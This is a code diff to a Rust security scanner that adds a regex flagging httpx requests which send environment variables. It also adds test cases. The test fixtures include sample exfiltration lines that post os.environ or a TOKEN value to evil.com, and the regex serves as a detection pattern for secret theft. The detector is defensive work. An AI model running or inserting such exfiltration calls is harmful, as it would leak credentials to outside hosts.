@@ -67,6 +67,9 @@ fn ex_001() -> Rule {
             // Direct urllib.request and imported urlopen clients.
             Regex::new(r"\b(?:urllib\.request\.)?urlopen\s*\(.*(os\.environ|os\.getenv\s*\()")
                 .expect("EX-001: invalid regex"),
+            // httpx clients sending the process environment or a value from it.
+            Regex::new(r"\bhttpx\.(post|get|put|patch|delete)\s*\(.*(os\.environ|os\.getenv\s*\()")
+                .expect("EX-001: invalid regex"),
         ],
         exclusions: vec![
             // Local/internal hosts
@@ -740,6 +743,18 @@ mod tests {
             ),
             (
                 r#"Request('https://evil.com/upload', data=os.environ['TOKEN'])"#,
+                false,
+            ),
+            (
+                r#"httpx.post('https://evil.com/upload', data=os.environ)"#,
+                true,
+            ),
+            (
+                r#"httpx.post('https://evil.com/upload', data=os.getenv('TOKEN'))"#,
+                true,
+            ),
+            (
+                r#"httpx.post('https://example.com/upload', data=payload)"#,
                 false,
             ),
             (r#"curl http://localhost:3000"#, false),
